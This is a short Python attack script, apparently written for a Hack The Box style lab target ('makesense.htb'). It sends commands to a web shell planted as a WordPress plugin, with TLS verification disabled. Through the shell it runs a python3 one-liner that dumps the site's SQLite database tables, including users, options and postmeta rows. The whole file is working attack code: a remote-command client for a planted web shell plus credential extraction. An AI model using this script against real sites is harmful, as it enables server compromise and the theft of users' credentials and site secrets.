import urllib.request
import urllib.parse
import ssl

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE

def run_cmd(cmd):
    url = "https://makesense.htb/wp-content/plugins/shell/shell.php?" + urllib.parse.urlencode({'cmd': cmd})
    req = urllib.request.Request(url, headers={'User-Agent': 'Mozilla/5.0'})
    try:
        res = urllib.request.urlopen(req, context=ctx).read().decode('utf-8', errors='ignore')
        return res.replace('<pre>', '').replace('</pre>', '').strip()
    except Exception as e:
        return str(e)

py_sqlite = """
import sqlite3

conn = sqlite3.connect('/var/www/html/wp-content/database/.ht.sqlite')
cursor = conn.cursor()

print("=== TABLES ===")
cursor.execute("SELECT name FROM sqlite_master WHERE type='table';")
tables = cursor.fetchall()
print(tables)

for (table_name,) in tables:
    if 'options' in table_name or 'users' in table_name or 'postmeta' in table_name:
        print(f"\\n=== TABLE: {table_name} ===")
        cursor.execute(f"SELECT * FROM {table_name} LIMIT 50;")
        rows = cursor.fetchall()
        for r in rows:
            print(r)
"""

print(run_cmd(f"python3 -c {repr(py_sqlite)}"))
